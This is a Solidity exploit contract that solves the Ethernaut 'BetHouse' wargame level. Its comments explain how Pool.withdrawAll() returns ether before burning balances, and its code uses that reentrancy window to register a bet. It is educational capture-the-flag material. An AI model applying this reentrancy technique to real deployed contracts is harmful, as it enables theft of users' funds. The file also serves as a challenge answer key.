// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Pool} from "./Pool.sol";
import {BetHouse} from "./BetHouse.sol";
import {PoolToken} from "./PoolToken.sol";

/**
 * @title BetHouseSolver
 * @notice Exploit contract for the Ethernaut "BetHouse" level.
 *
 * @dev Root cause of the vulnerability:
 *      `Pool.withdrawAll()` sends the deposited PDT and ether back to the
 *      caller BEFORE it burns the caller's wrapped-token balance:
 *
 *          1. transfer PDT back to caller
 *          2. send ether back to caller  <-- triggers this contract's receive()
 *          3. burn(caller, balanceOf(caller))
 *
 *      Because step 2 hands control back to us via `receive()`, we can
 *      re-enter the Pool while our wrapped-token balance is still fully
 *      intact (it hasn't been burned yet) and:
 *        - deposit our returned PDT again to mint MORE wrapped tokens
 *          (bringing our balance to 20, the BET_PRICE threshold), then
 *        - lock deposits, and
 *        - call `BetHouse.makeBet(player)`, which only checks
 *          `balanceOf(msg.sender) >= 20` and `depositsLocked(msg.sender)`
 *          at that exact moment — both of which we've just satisfied.
 *
 *      Only after our reentrant call returns does the original
 *      `withdrawAll()` resume and burn our balance — too late, the bet has
 *      already been registered for `player`.
 */
contract BetHouseSolver {
    Pool public immutable pool;
    BetHouse public immutable betHouse;
    PoolToken public immutable depositToken;
    address public immutable player;

    constructor(address _betHouse, address _player) {
        betHouse = BetHouse(_betHouse);
        pool = Pool(betHouse.pool());
        depositToken = PoolToken(address(pool.depositToken()));
        player = _player;
    }

    /**
     * @notice Reentrancy hook, fired when `Pool.withdrawAll()` sends our
     *         ether back mid-call.
     * @dev Guarded so it only runs during the genuine reentrancy from the
     *      Pool, not on ordinary funding transfers (e.g. the script sending
     *      this contract its starting ETH balance).
     */
    receive() external payable {
        if (msg.sender != address(pool)) return;

        // Re-deposit the 5 PDT that withdrawAll() just returned to us.
        // This mints another 5 wrapped tokens on top of the 15 we already
        // hold (10 from the ether deposit + 5 from the first PDT deposit),
        // bringing our wrapped balance to 20 == BET_PRICE.
        depositToken.approve(address(pool), 5);
        pool.deposit(5);

        // Lock deposits for this contract so BetHouse.makeBet()'s
        // `depositsLocked` check passes.
        pool.lockDeposits();

        // Register `player` as a bettor while our wrapped balance is still
        // 20 (the outer withdrawAll() call hasn't burned it yet).
        betHouse.makeBet(player);
    }

    /**
     * @notice Kicks off the exploit. Expects this contract to already hold:
     *         - 0.001 ether (for the ether-deposit leg)
     *         - 5 PDT (for the token-deposit leg)
     */
    function attack() external {
        // Step 1: approve and deposit 5 PDT + 0.001 ETH.
        //   -> mints 10 (ether leg) + 5 (PDT leg) = 15 wrapped tokens.
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);

        // Step 2: trigger withdrawAll(). This returns our PDT and ether
        // BEFORE burning our wrapped balance, giving us a reentrancy
        // window via `receive()` (see above) to push our balance to 20
        // and register the bet before the burn actually happens.
        pool.withdrawAll();
    }
}
